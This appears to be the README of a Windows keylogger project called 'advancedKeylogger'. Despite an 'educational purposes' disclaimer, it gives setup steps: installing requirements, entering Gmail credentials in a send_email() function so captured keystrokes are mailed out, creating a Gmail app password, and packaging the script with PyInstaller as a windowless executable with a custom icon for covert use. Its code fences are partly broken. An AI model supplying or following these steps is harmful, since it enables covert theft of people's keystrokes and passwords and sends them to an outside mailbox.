FOR EDUCATIONAL PURPOSES ONLY
#### System requirements
- MS Windows 10/11
- [Python 3](https://www.python.org/downloads/)

#### Usage
```
cd advancedKeylogger

```
python3 -m pip install -r requirements.txt
```
### Important: Configure Email Settings

Before running the project, make sure to fill in the following fields in the `send_email()` function:

```python
from_email = "" 
to_email = ""
password = ""
```

You should create a dedicated Gmail account for this purpose to handle email distribution. For detailed instructions, [click here](#configuring-gmail-smtp-settings) to learn how to enable SMTP and generate an app password.

python3 -m PyInstaller --onefile --noconsole --icon=icon.ico temp.py
```
cd dist
```


### Configuring Gmail SMTP Settings

If you want to use a Gmail account to send emails, follow these steps:

1. **Enable 2-Step Verification**:
   - Go to your [Google Account Security page](https://myaccount.google.com/security).
   - Under "Signing in to Google," click on **2-Step Verification** and follow the instructions to enable it.

2. **Create an App Password**:
   - Once 2-Step Verification is enabled, go to [this link](https://myaccount.google.com/apppasswords) and log in.
   - Enter a name for your app password(e.g., `Keylogger`) and click **Create**.
   - A 16-character app password will be shown. Copy this password.

3. **Update Your Code**:
   - Use this app password as the `password` in your `send_email()` function instead of your Gmail account password.

This will allow your script to send emails securely while keeping your Gmail account protected.

check this guide: [Google Support](https://support.google.com/accounts/answer/185833?hl=en).
